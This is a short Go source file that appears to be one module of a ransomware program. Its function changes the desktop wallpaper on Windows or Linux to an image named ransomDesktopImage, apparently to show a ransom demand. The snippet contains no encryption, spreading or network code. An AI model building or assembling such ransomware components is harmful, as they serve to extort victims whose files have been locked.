package notes

import (
	"log"
	"os"
	"path/filepath"
	"runtime"
)

func ChangeBackgroundImage() {
	currentWorkingDirectory, err := os.Getwd()
	if err != nil {
		log.Println("[-] Error getting current working directory:", err)
		return
	}
	imagePath := filepath.Join(currentWorkingDirectory, ransomDesktopImage)
	// Change desktop background
	switch runtime.GOOS {
	case "windows":
		if err := changeWindowsBackground(imagePath); err != nil {
			log.Println("[-] Failed to set wallpaper on Windows:", err)
		}
	case "linux":
		changeLinuxBackground(imagePath)
	default:
		log.Println("[-] Unsupported OS")
	}
}
